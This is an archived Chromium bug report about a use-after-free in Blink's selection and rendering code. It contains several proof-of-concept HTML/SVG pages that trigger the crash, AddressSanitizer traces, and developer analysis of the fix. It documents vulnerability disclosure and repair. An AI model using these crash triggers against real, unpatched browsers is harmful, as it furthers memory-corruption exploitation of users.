# Heap-use-after-free in WebCore::RenderObject::childAt

| Field | Value |
|-------|-------|
| **Issue ID** | [40051851](https://issues.chromium.org/issues/40051851) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink, Blink>DOM, Blink>SVG |
| **Reporter** | ax...@gmail.com |
| **Assignee** | in...@chromium.org |
| **Created** | 2011-12-05 |
| **Bounty** | $1,000.00 |

## Description

**VULNERABILITY DETAILS**  

Use-after-free happens while trying to use freed child object wihin selection.

**VERSION**  

Chrome 17.0.961.0 (Developer Build 112955 Linux)  

Unable to reproduce on stable, beta or dev.

**REPRODUCTION CASE**

<html>
<head>
<script>
function body\_start() {
var q = document.getElementById('root').contentDocument;
s = q.getElementById('s');
g = q.getElementById('g');
t = q.getElementById('t');
f = q.getElementById('f');
```
        var sel = window.getSelection();  
        var rng = document.createRange();  
        sel.addRange(rng);   
        rng.selectNodeContents(t);  
        sel.addRange(rng);  
        s.insertBefore(g, f.nextSibling);  
    }  
    </script>  
</head>  
<body>  
    <object data="i.svg" id="root" onload="body_start()"/></object>  
</body>  

```
</html>

---- i.svg ---

<!-- Comment -->
<svg id="s" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<g id="g">
<text id="t" >text</text>
</g>
<fefuncr id="f"></fefuncr>
</svg>

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

==31186== ERROR: AddressSanitizer heap-use-after-free on address 0x7f91a1645680 at pc 0x7f91afbc0ab3 bp 0x7fff8f3faee0 sp 0x7fff8f3faeb8  

READ of size 8 at 0x7f91a1645680 thread T0  

#0 0x7f91afbc0ab3 in WebCore::RenderObject::firstChild() const /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/rendering/RenderObject.h:148  

#1 0x7f91b0900a0e in WebCore::RenderObject::childAt(unsigned int) const /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/rendering/RenderObject.cpp:426  

#2 0x7f91b0985978 in WebCore::rendererAfterPosition(WebCore::RenderObject\*, unsigned int) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/rendering/RenderView.cpp:375  

#3 0x7f91b09862f2 in WebCore::RenderView::setSelection(WebCore::RenderObject\*, int, WebCore::RenderObject\*, int, WebCore::RenderView::SelectionRepaintMode) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/rendering/RenderView.cpp:467  

#4 0x7f91b02793e5 in WebCore::FrameSelection::updateAppearance() /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/editing/FrameSelection.cpp:1730  

#5 0x7f91b049411c in WebCore::FrameView::performPostLayoutTasks() /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/page/FrameView.cpp:2260  

#6 0x7f91b0493827 in WebCore::FrameView::layout(bool) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/page/FrameView.cpp:1165  

#7 0x7f91b0495bd4 in WebCore::FrameView::forceLayoutParentViewIfNeeded() /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/page/FrameView.cpp:926  

#8 0x7f91b04939bc in WebCore::FrameView::layout(bool) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/page/FrameView.cpp:1196  

#9 0x7f91b049f534 in WebCore::FrameView::updateLayoutAndStyleIfNeededRecursive() /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/page/FrameView.cpp:2970  

#10 0x7f91b049f597 in WebCore::FrameView::updateLayoutAndStyleIfNeededRecursive() /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/page/FrameView.cpp:2979  

#11 0x7f91af7dd2c7 in WebKit::WebViewImpl::layout() /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebKit/chromium/src/WebViewImpl.cpp:1168  

#12 0x7f91b1c82d2d in RenderWidget::DoDeferredUpdate() /media/Chromium/chromium/depot\_tools/src/content/renderer/render\_widget.cc:726  

#13 0x7f91b1c7e475 in RenderWidget::DoDeferredUpdateAndSendInputAck() /media/Chromium/chromium/depot\_tools/src/content/renderer/render\_widget.cc:688  

#14 0x7f91b1c7ac8f in RenderWidget::OnUpdateRectAck() /media/Chromium/chromium/depot\_tools/src/content/renderer/render\_widget.cc:380  

#15 0x7f91b1c7a094 in bool IPC::Message::Dispatch<RenderWidget, RenderWidget>(IPC::Message const\*, RenderWidget\*, RenderWidget\*, void (RenderWidget::\*)()) /media/Chromium/chromium/depot\_tools/src/./ipc/ipc\_message.h:137  

#16 0x7f91b1c79e27 in RenderWidget::OnMessageReceived(IPC::Message const&) /media/Chromium/chromium/depot\_tools/src/content/renderer/render\_widget.cc:209  

#17 0x7f91b1c40313 in RenderViewImpl::OnMessageReceived(IPC::Message const&) /media/Chromium/chromium/depot\_tools/src/content/renderer/render\_view\_impl.cc:710  

#18 0x7f91af6cbbfd in MessageRouter::RouteMessage(IPC::Message const&) /media/Chromium/chromium/depot\_tools/src/content/common/message\_router.cc:46  

#19 0x7f91af6cbb7e in MessageRouter::OnMessageReceived(IPC::Message const&) /media/Chromium/chromium/depot\_tools/src/content/common/message\_router.cc:39  

#20 0x7f91af5ffbd3 in ChildThread::OnMessageReceived(IPC::Message const&) /media/Chromium/chromium/depot\_tools/src/content/common/child\_thread.cc:204  

#21 0x7f91af73ce1e in IPC::ChannelProxy::Context::OnDispatchMessage(IPC::Message const&) /media/Chromium/chromium/depot\_tools/src/ipc/ipc\_channel\_proxy.cc:263  

#22 0x7f91af741de5 in base::internal::InvokeHelper<false, void, base::internal::RunnableAdapter<void (IPC::ChannelProxy::Context::\*)(IPC::Message const&)>, void ()(IPC::ChannelProxy::Context\* const&, IPC::Message const&)>::MakeItSo(base::internal::RunnableAdapter<void (IPC::ChannelProxy::Context::\*)(IPC::Message const&)>, IPC::ChannelProxy::Context\* const&, IPC::Message const&) /media/Chromium/chromium/depot\_tools/src/./base/bind\_internal.h:877  

#23 0x7f91ae32c893 in MessageLoop::RunTask(base::PendingTask const&) /media/Chromium/chromium/depot\_tools/src/base/message\_loop.cc:501  

#24 0x7f91ae32ced4 in MessageLoop::DeferOrRunPendingTask(base::PendingTask const&) /media/Chromium/chromium/depot\_tools/src/base/message\_loop.cc:512  

#25 0x7f91ae32d28e in MessageLoop::DoWork() /media/Chromium/chromium/depot\_tools/src/base/message\_loop.cc:702  

#26 0x7f91ae339a4e in base::MessagePumpDefault::Run(base::MessagePump::Delegate\*) /media/Chromium/chromium/depot\_tools/src/base/message\_pump\_default.cc:28  

#27 0x7f91ae32bfb4 in MessageLoop::RunInternal() /media/Chromium/chromium/depot\_tools/src/base/message\_loop.cc:460  

#28 0x7f91ae32acc8 in MessageLoop::Run() /media/Chromium/chromium/depot\_tools/src/base/message\_loop.cc:343  

#29 0x7f91b1c9b602 in RendererMain(content::MainFunctionParams const&) /media/Chromium/chromium/depot\_tools/src/content/renderer/renderer\_main.cc:241  

#30 0x7f91ae29d1d4 in (anonymous namespace)::RunZygote(content::MainFunctionParams const&, content::ContentMainDelegate\*) /media/Chromium/chromium/depot\_tools/src/content/app/content\_main.cc:232  

#31 0x7f91ae29cd6b in (anonymous namespace)::RunNamedProcessTypeMain(std::basic\_string<char, std::char\_traits<char>, std::allocator<char> > const&, content::MainFunctionParams const&, content::ContentMainDelegate\*) /media/Chromium/chromium/depot\_tools/src/content/app/content\_main.cc:270  

#32 0x7f91ae29c4dd in content::ContentMain(int, char const\*\*, content::ContentMainDelegate\*) /media/Chromium/chromium/depot\_tools/src/content/app/content\_main.cc:454  

#33 0x7f91acea0907 in ChromeMain /media/Chromium/chromium/depot\_tools/src/chrome/app/chrome\_main.cc:32  

#34 0x7f91acea082b in main /media/Chromium/chromium/depot\_tools/src/chrome/app/chrome\_exe\_main\_gtk.cc:18  

#35 0x7f91a63edd8e in \_\_libc\_start\_main /build/buildd/eglibc-2.12.1/csu/libc-start.c:258  

#36 0x7f91acea0749 in \_start ??:0  

0x7f91a1645680 is located 0 bytes inside of 312-byte region [0x7f91a1645680,0x7f91a16457b8)  

freed by thread T0 here:  

#0 0x7f91b2652061 in free /usr/local/google/asan/address-sanitizer/asan/asan\_malloc\_linux.cc:37  

#1 0x7f91afc47d31 in WebCore::Node::detach() /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/dom/Node.cpp:1413  

#2 0x7f91afbbfac9 in WebCore::ContainerNode::detach() /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/dom/ContainerNode.cpp:790  

#3 0x7f91afc25a4a in WebCore::Element::detach() /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/dom/Element.cpp:1027  

#4 0x7f91afbbfac9 in WebCore::ContainerNode::detach() /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/dom/ContainerNode.cpp:790  

#5 0x7f91afc25a4a in WebCore::Element::detach() /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/dom/Element.cpp:1027  

#6 0x7f91afbbe4b0 in WebCore::ContainerNode::removeBetween(WebCore::Node\*, WebCore::Node\*, WebCore::Node\*) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/dom/ContainerNode.cpp:499  

#7 0x7f91afbbc5fa in WebCore::ContainerNode::removeChild(WebCore::Node\*, int&) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/dom/ContainerNode.cpp:477  

#8 0x7f91afbbb911 in WebCore::ContainerNode::insertBefore(WTF::PassRefPtr[WebCore::Node](javascript:void(0);), WebCore::Node\*, int&, bool) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/dom/ContainerNode.cpp:157  

#9 0x7f91afc44990 in WebCore::Node::insertBefore(WTF::PassRefPtr[WebCore::Node](javascript:void(0);), WebCore::Node\*, int&, bool) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/dom/Node.cpp:659  

#10 0x7f91b00f09c6 in WebCore::V8Node::insertBeforeCallback(v8::Arguments const&) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/bindings/v8/custom/V8NodeCustom.cpp:70  

addr2line: '': No such file  

#11 0x7f91aeda4013 in HandleApiCallHelper /media/Chromium/chromium/depot\_tools/src/v8/src/builtins.cc:1177  

#12 0x286cae0420e in  

#13 0x286cae28cde in  

#14 0x286cae287db in  

#15 0x286cae28a15 in  

#16 0x286cae1fc47 in  

#17 0x286cae07a77 in  

#18 0x7f91aedec7c3 in v8::internal::Invoke(bool, v8::internal::Handle[v8::internal::JSFunction](javascript:void(0);), v8::internal::Handle[v8::internal::Object](javascript:void(0);), int, v8::internal::Handle[v8::internal::Object](javascript:void(0);)\*, bool\*) /media/Chromium/chromium/depot\_tools/src/v8/src/execution.cc:118  

#19 0x7f91aed57dd7 in v8::internal::Isolate::handle\_scope\_implementer() /media/Chromium/chromium/depot\_tools/src/v8/src/isolate.h:838  

#20 0x7f91b00c5e6f in WebCore::V8Proxy::instrumentedCallFunction(WebCore::Page\*, v8::Handle[v8::Function](javascript:void(0);), v8::Handle[v8::Object](javascript:void(0);), int, v8::Handle[v8::Value](javascript:void(0);)\*) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/bindings/v8/V8Proxy.cpp:460  

#21 0x7f91b00c5b4c in WebCore::V8Proxy::callFunction(v8::Handle[v8::Function](javascript:void(0);), v8::Handle[v8::Object](javascript:void(0);), int, v8::Handle[v8::Value](javascript:void(0);)\*) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/bindings/v8/V8Proxy.cpp:435  

#22 0x7f91b00b5833 in WebCore::V8LazyEventListener::callListenerFunction(WebCore::ScriptExecutionContext\*, v8::Handle[v8::Value](javascript:void(0);), WebCore::Event\*) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/bindings/v8/V8LazyEventListener.cpp:69  

#23 0x7f91b05bb56d in WebCore::V8AbstractEventListener::invokeEventHandler(WebCore::ScriptExecutionContext\*, WebCore::Event\*, v8::Handle[v8::Value](javascript:void(0);)) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/bindings/v8/V8AbstractEventListener.cpp:152  

#24 0x7f91b05bb142 in WebCore::V8AbstractEventListener::handleEvent(WebCore::ScriptExecutionContext\*, WebCore::Event\*) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/bindings/v8/V8AbstractEventListener.cpp:98  

#25 0x7f91afc3732d in WebCore::EventTarget::fireEventListeners(WebCore::Event\*, WebCore::EventTargetData\*, WTF::Vector<WebCore::RegisteredEventListener, 1ul>&) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/dom/EventTarget.cpp:214  

#26 0x7f91afc36fe7 in WebCore::EventTarget::fireEventListeners(WebCore::Event\*) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/dom/EventTarget.cpp:199  

#27 0x7f91afc4f08e in WebCore::Node::handleLocalEvents(WebCore::Event\*) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/dom/Node.cpp:2844  

#28 0x7f91afcc384e in WebCore::EventDispatcher::dispatchEvent(WTF::PassRefPtr[WebCore::Event](javascript:void(0);)) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/dom/EventDispatcher.cpp:319  

previously allocated by thread T0 here:  

#0 0x7f91b265222b in malloc /usr/local/google/asan/address-sanitizer/asan/asan\_malloc\_linux.cc:49  

#1 0x7f91afc9be7c in WebCore::Text::createRenderer(WebCore::RenderArena\*, WebCore::RenderStyle\*) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/dom/Text.cpp:238  

#2 0x7f91afc63fd5 in WebCore::NodeRendererFactory::createRenderer() /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/dom/NodeRenderingContext.cpp:293  

#3 0x7f91afc643bf in WebCore::NodeRendererFactory::createRendererIfNeeded() /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/dom/NodeRenderingContext.cpp:339  

#4 0x7f91afc47c86 in WebCore::Node::createRendererIfNeeded() /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/dom/Node.cpp:1489  

#5 0x7f91afc9c031 in WebCore::Text::attach() /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/dom/Text.cpp:250  

#6 0x7f91b0567bb0 in WebCore::XMLDocumentParser::exitText() /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/xml/parser/XMLDocumentParser.cpp:181  

#7 0x7f91b056c31f in WebCore::XMLDocumentParser::endElementNs() /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/xml/parser/XMLDocumentParserLibxml2.cpp:817  

#8 0x7f91af8fa71c in xmlParseEndTag2 /media/Chromium/chromium/depot\_tools/src/third\_party/libxml/src/parser.c:9226  

#9 0x7f91af902b2f in xmlParseTryOrFinish /media/Chromium/chromium/depot\_tools/src/third\_party/libxml/src/parser.c:11034  

#10 0x7f91af8ff5c1 in xmlParseChunk /media/Chromium/chromium/depot\_tools/src/third\_party/libxml/src/parser.c:11625  

#11 0x7f91b056a19b in WebCore::XMLDocumentParser::doWrite(WTF::String const&) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/xml/parser/XMLDocumentParserLibxml2.cpp:657  

#12 0x7f91b0567687 in ~RefPtr /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/JavaScriptCore/wtf/RefPtr.h:58  

#13 0x7f91b22a441e in WebCore::DecodedDataDocumentParser::appendBytes(WebCore::DocumentWriter\*, char const\*, unsigned long) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/dom/DecodedDataDocumentParser.cpp:50  

#14 0x7f91b0398ef1 in ~RefPtr /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/JavaScriptCore/wtf/RefPtr.h:58  

#15 0x7f91af81ed6b in WebKit::FrameLoaderClientImpl::committedLoad(WebCore::DocumentLoader\*, char const\*, int) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebKit/chromium/src/FrameLoaderClientImpl.cpp:1115  

#16 0x7f91b0398df0 in void WTF::derefIfNotNull[WebCore::DocumentLoader](javascript:void(0);)(WebCore::DocumentLoader\*) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/JavaScriptCore/wtf/PassRefPtr.h:52  

#17 0x7f91b03f58a2 in WebCore::ResourceLoader::didReceiveData(char const\*, int, long long, bool) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/loader/ResourceLoader.cpp:291  

#18 0x7f91b03e08ed in void WTF::derefIfNotNull[WebCore::MainResourceLoader](javascript:void(0);)(WebCore::MainResourceLoader\*) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/JavaScriptCore/wtf/PassRefPtr.h:52  

#19 0x7f91b03f6699 in WebCore::ResourceLoader::didReceiveData(WebCore::ResourceHandle\*, char const\*, int, int) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/loader/ResourceLoader.cpp:442  

#20 0x7f91af6eb5c9 in ResourceDispatcher::OnReceivedData(IPC::Message const&, int, base::FileDescriptor, int, int) /media/Chromium/chromium/depot\_tools/src/content/common/resource\_dispatcher.cc:393  

#21 0x7f91af6ecb63 in bool ResourceMsg\_DataReceived::Dispatch<ResourceDispatcher, ResourceDispatcher, int, base::FileDescriptor, int, int>(IPC::Message const\*, ResourceDispatcher\*, ResourceDispatcher\*, void (ResourceDispatcher::\*)(IPC::Message const&, int, base::FileDescriptor, int, int)) /media/Chromium/chromium/depot\_tools/src/./content/common/resource\_messages.h:151  

#22 0x7f91af6ead37 in ResourceDispatcher::DispatchMessage(IPC::Message const&) /media/Chromium/chromium/depot\_tools/src/content/common/resource\_dispatcher.cc:539  

==31186== ABORTING  

Stats: 38M malloced (49M for red zones) by 195966 calls  

Stats: 3M realloced by 2938 calls  

Stats: 24M freed by 58926 calls  

Stats: 0M really freed by 0 calls  

Stats: 112M (28685 full pages) mmaped in 28 calls  

mmaps by size class: 8:196596; 9:8191; 10:4095; 11:2047; 12:1024; 13:512; 14:256; 15:256; 16:64; 17:64; 18:16; 19:8; 21:4; 22:1;  

mallocs by size class: 8:182619; 9:7186; 10:3781; 11:1103; 12:458; 13:408; 14:174; 15:170; 16:21; 17:34; 18:1; 19:6; 21:4; 22:1;  

frees by size class: 8:46783; 9:6634; 10:3518; 11:861; 12:381; 13:383; 14:156; 15:164; 16:14; 17:21; 18:1; 19:6; 21:4;  

rfrees by size class:  

Stats: malloc large: 46 small slow: 561  

Shadow byte and word:  

0x1ff2342c8ad0: fd  

0x1ff2342c8ad0: fd fd fd fd fd fd fd fd  

More shadow bytes:  

0x1ff2342c8ab0: fa fa fa fa fa fa fa fa  

0x1ff2342c8ab8: fa fa fa fa fa fa fa fa  

0x1ff2342c8ac0: fa fa fa fa fa fa fa fa  

0x1ff2342c8ac8: fa fa fa fa fa fa fa fa  

=>0x1ff2342c8ad0: fd fd fd fd fd fd fd fd  

0x1ff2342c8ad8: fd fd fd fd fd fd fd fd  

0x1ff2342c8ae0: fd fd fd fd fd fd fd fd  

0x1ff2342c8ae8: fd fd fd fd fd fd fd fd  

0x1ff2342c8af0: fd fd fd fd fd fd fd fd

## Attachments

- [asan-04-12-2011.txt](attachments/asan-04-12-2011.txt) (text/x-c; charset=us-ascii, 11.3 KB)
- [DOMSelection.patch](attachments/DOMSelection.patch) (text/x-c++; charset=us-ascii, 2.4 KB)

## Timeline

### ax...@gmail.com (2011-12-05)

PS: however, the first crash appeared on stable, under Linux (15.0.874.121). ASan log for this very first case was saved under Linux build 17.0.954.0 (in attachment, if it can help). Later, while trying to reduce test case, it was so oversimplified, that works currently only under latest build. Will try to reproduce that on stable, but cannot promise, while it is can require complex setup of conditions.

### pa...@chromium.org (2011-12-06)

Seems to be a regression: Can't make it explode in 16. Reliable on Linux ToT.

Tried to fold the SVG into the main file using a data: URL to simplify analysis, but I don't get a crash doing it that way (the data: URL is in a different origin that the body_start function can't access).

### pa...@chromium.org (2011-12-06)

We are confused about whether this is a range issue, or an SVG issue. rniwa, any clues? Thanks.

### [Deleted User] (2011-12-06)

This looks like a SVG issue. File a WebKit bug and cc WildFox.

### js...@chromium.org (2011-12-06)

We were hoping you could take a quick look because filing a bug and CCing any of the SVG guys rarely improves the odds of it getting fixed. So, we usually end up fixing all their bugs for them.

### [Deleted User] (2011-12-06)

I'm pretty certain this is caused by some SVG rendering code. I'll be shocked if not. Unfortunately, I don't know much about rendering and nothing about SVG so I can't help you here.

### js...@chromium.org (2011-12-06)

Fair enough. I just wanted to verify that it didn't look like a range issue before adding it to our todo list. Thanks.

### sk...@chromium.org (2011-12-09)

@rniwa: Out of curiosity I had a look and found that there does seem to be a problem in the Range/DOMSelection code:

short Range::compareBoundaryPoints(CompareHow how, const Range* sourceRange, ExceptionCode& ec) const
{
<<<snip>>>
    ec = 0;
    Node* thisCont = commonAncestorContainer(ec);
    if (ec)
        return 0;
    Node* sourceCont = sourceRange->commonAncestorContainer(ec);
    if (ec)
        return 0;

    if (thisCont->document() != sourceCont->document()) {
        ec = WRONG_DOCUMENT_ERR;
        return 0;
    }
<<<snip>>>
*** NB: compareBoundaryPoints ALWAY returns 0 if the ranges are in different documents!
*** addRange call compareBoundaryPoints, but does not check "ec" at all:
    
void DOMSelection::addRange(Range* r)
{
<<<snip>>>
    RefPtr<Range> range = selection->selection().toNormalizedRange();
    ExceptionCode ec = 0;
    if (r->compareBoundaryPoints(Range::START_TO_START, range.get(), ec) == -1) {
*** different document => always false
<<<snip>>>
    } else {
        // We don't support discontiguous selection. We don't do anything if r and range don't intersect.
        if (r->compareBoundaryPoints(Range::END_TO_START, range.get(), ec) < 1) {
*** different document => always true
            if (r->compareBoundaryPoints(Range::END_TO_END, range.get(), ec) == -1)
*** different document => always false
<<<snip>>>
            else
                // The original range and r intersect.
*** This may not be correct
                selection->setSelection(VisibleSelection(range->startPosition(), r->endPosition(), DOWNSTREAM));
        }
    }
}

I've not found out if this is the root cause of the crash, I'll look into this a bit further on Monday.
The following repro triggers the same issue, but is slightly more readable:
---repro.html---
<html>
  <head>
    <script>
      function go() {
          var oObjectElement = document.getElementById('object'),
              oSvgDoc = oObjectElement.contentDocument,
              oSvgElement = oSvgDoc.documentElement;

          var oSelection = window.getSelection();
          var oRange = document.createRange();      // Range is empty
          oSelection.addRange(oRange);              // Selection is in HtmlDocument
          oRange.selectNode(oSvgElement);           // Range contains svg in SvgDocument
          oSelection.addRange(oRange);              // addRange/compareBoundaryPoints different document issue triggered
          oSvgDoc.removeChild(oSvgElement);         // svg elements removed
          window.gc && gc();                        // svg elements freed?
          oSelection.removeAllRanges();             // access svg elements after free?
      }
    </script>
  </head>
  <body>
    <object id="object" data="repro.svg" onload="go()"></object>
  </body>
</html>
---repro.svg---
<text>x</text>

### [Deleted User] (2011-12-09)

Even though that DOES sound like a bug, I don't think that's what's causing the crash.

### sk...@chromium.org (2011-12-11)

I'll look into this some more tomorrow and split that one off into a new bug if it is indeed not the root cause of this issue.

### sk...@chromium.org (2011-12-12)

DOMSelection::addRange bug filed upstream: https://bugs.webkit.org/show_bug.cgi?id=74285

Fixing the DOMSelection::addRange code to return without modifying the selection if ec != 0 (patch attached) prevents the PoC from crashing Chrome.

@rniwa: Would you mind looking at this DOMSelection::addRange bug for me? SVN Blame tells me the code has not been touched in years. Given that the bug only affects Chrome 18+, this seems to confirm your suspicion of another bug in SVG code being the main culprit. I'll see if I can find that one now.

### [Deleted User] (2011-12-12)

Wait, if you already have a patch, why don't you just post that?


### [Deleted User] (2011-12-12)

Since you already have a good code change, you should just upload that on the Bugzilla. I'm more than happy to review the patch.

### sk...@chromium.org (2011-12-12)

Thanks, will do - I wasn't sure if the fix was actually a good one: I just hacked something together to see what would happen. It's late here now and I'm off tomorrow and the day after, but I may be able to find some time to submit a patch.

### in...@chromium.org (2011-12-13)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=4417036

Uploader: inferno@chromium.org

Crash Type: Heap-use-after-free READ 8
Crash Address: 0x7f5ffcf57080
Crash State:
  - crash stack -
  WebCore::RenderObject::childAt
  WebCore::RenderView::setSelection
  - free stack -
  WebCore::Node::detach
  WebCore::ContainerNode::detach
  

Minimized Testcase (0.43 Kb): https://cluster-fuzz.appspot.com/download/AMIfv97de7KkUdfrPBD9OI2KIHBo5Q236Bi61ZT-O41hVEPzolAHZGNNJhkcaO3K6qDv442k9m9p6CF-lqXvsoAfBsQVTO9qNIzXjKDWyZOl8dycLDDbjPdKFJRxyh4DDnlz583iLg6CXuz1qcdm0hNENDRqtEdRDQ

### in...@chromium.org (2011-12-13)

[Empty comment from Monorail migration]

### in...@chromium.org (2011-12-14)

[Empty comment from Monorail migration]

### sk...@chromium.org (2011-12-16)

meh, I didn't get to do this yet. I'll try to make sure I can get this patched on Monday.

### sk...@chromium.org (2011-12-16)

Quick question: is a RenderView object tied to a specific Document object? And is it legal for it to reference to Nodes in two or more Document objects (eg. m_selectionStart in one Document and m_selectionEnd in another)?

It seems that the problem I mentioned in https://crbug.com/chromium/106484#c11 leads to such a situation, and I think that this is not supposed to happen. It seems the repro is deleting the Node while the RenderView still has a reference to it in m_selectionEnd, which it later uses, causing a crash. If so, this may not be an SVG issue. If not, I have no idea what the SVG issue may be.

### [Deleted User] (2011-12-16)

RenderView should only be associated to exactly one document. If it ever access a node that doesn't belong to the document RenderView is associated with, then that's a bug as far as I know.

### sk...@chromium.org (2011-12-16)

I thought so - I think that there is no SVG bug then, only the bug I mentioned, which allows a RenderView to reference a Node in a different Document. It may make sense to to add a few ASSERTS/BUGCHECKS to check the Documents match wherever a reference to a Node is added to a RenderView - I'll look into that as well.

### ax...@gmail.com (2011-12-18)

[Comment Deleted]

### ax...@gmail.com (2011-12-18)

Sorry - deleted my previous comment - was too fast. Got smaller repro. 
I have slightly modified the repro above (by skylined):

<html>
  <head>
    <script>
      function go() {
          //document.getElementById('object').innerHTML = 'text';
          var oObjectElement = document.getElementById('object'),
              oSvgDoc = oObjectElement.contentDocument,
              oSvgElement = oSvgDoc.documentElement;

          var oSelection = window.getSelection();
          var oRange = document.createRange();      // Range is empty
          //oSelection.addRange(oRange);              // Selection is in HtmlDocument
          oRange.selectNode(oSvgElement);           // Range contains svg in SvgDocument
          oSelection.addRange(oRange);              // addRange/compareBoundaryPoints different document issue triggered
          oSvgDoc.removeChild(oSvgElement);         // svg elements removed
          //window.gc && gc();                        // svg elements freed?
          //oSelection.removeAllRanges();             // access svg elements after free?
      }
    </script>
  </head>
  <body>
    <iframe id="object" onload="go()"></iframe>
  </body>
</html> 

In this case no SVG - looks like it is dependency on some external document. Crash reproduced on 18.0.974.0 (Developer Build 114913 Linux):

==26557== ERROR: AddressSanitizer heap-use-after-free on address 0x7facb00b2680 at pc 0x7facbe3c7c10 bp 0x7fff9e798a30 sp 0x7fff9e798a28
READ of size 8 at 0x7facb00b2680 thread T0
    #0 0x7facbe3c7c10 in WebCore::RenderObject::firstChild() const /media/Chromium/chromium/depot_tools/src/third_party/WebKit/Source/WebCore/rendering/RenderObject.h:148
    #1 0x7facbea8eecd in WebCore::FrameSelection::updateAppearance() /media/Chromium/chromium/depot_tools/src/third_party/WebKit/Source/WebCore/editing/FrameSelection.cpp:1693
    #2 0x7facbecaa6b0 in WebCore::FrameView::performPostLayoutTasks() /media/Chromium/chromium/depot_tools/src/third_party/WebKit/Source/WebCore/page/FrameView.cpp:2287
    #3 0x7facbeca9d95 in WebCore::FrameView::layout(bool) /media/Chromium/chromium/depot_tools/src/third_party/WebKit/Source/WebCore/page/FrameView.cpp:1177
    #4 0x7facbe3d9bc4 in WebCore::Document::implicitClose() /media/Chromium/chromium/depot_tools/src/third_party/WebKit/Source/WebCore/dom/Document.cpp:2265
    #5 0x7facbebd5775 in WebCore::FrameLoader::checkCompleted() /media/Chromium/chromium/depot_tools/src/third_party/WebKit/Source/WebCore/loader/FrameLoader.cpp:745
    #6 0x7facc2755a40 in ?? /media/Chromium/chromium/depot_tools/src/third_party/libjpeg_turbo/simd/jiss2red-64.asm:0
0x7facb00b2680 is located 0 bytes inside of 184-byte region [0x7facb00b2680,0x7facb00b2738)
freed by thread T0 here:
    #0 0x7facc0e79334 in free ??:0
    #1 0x7facbe45572e in WebCore::Node::detach() /media/Chromium/chromium/depot_tools/src/third_party/WebKit/Source/WebCore/dom/Node.cpp:1394
    #2 0x7facbe4521a4 in WebCore::Node::removeChild(WebCore::Node*, int&) /media/Chromium/chromium/depot_tools/src/third_party/WebKit/Source/WebCore/dom/Node.cpp:670
    #3 0x7facbd58c7f3 in HandleApiCallHelper /media/Chromium/chromium/depot_tools/src/v8/src/builtins.cc:1177
    #4 0x6aba400420e in  
    #5 0x6aba4030215 in  
    #6 0x6aba402fe1b in  
    #7 0x6aba4030055 in  
    #8 0x6aba401fc47 in  
    #9 0x6aba4007a77 in  
    #10 0x7facbd5d556b in v8::internal::Invoke(bool, v8::internal::Handle<v8::internal::JSFunction>, v8::internal::Handle<v8::internal::Object>, int, v8::internal::Handle<v8::internal::Object>*, bool*) /media/Chromium/chromium/depot_tools/src/v8/src/execution.cc:118
    #11 0x7facbd5409e7 in v8::internal::Isolate::handle_scope_implementer() /media/Chromium/chromium/depot_tools/src/v8/src/isolate.h:838
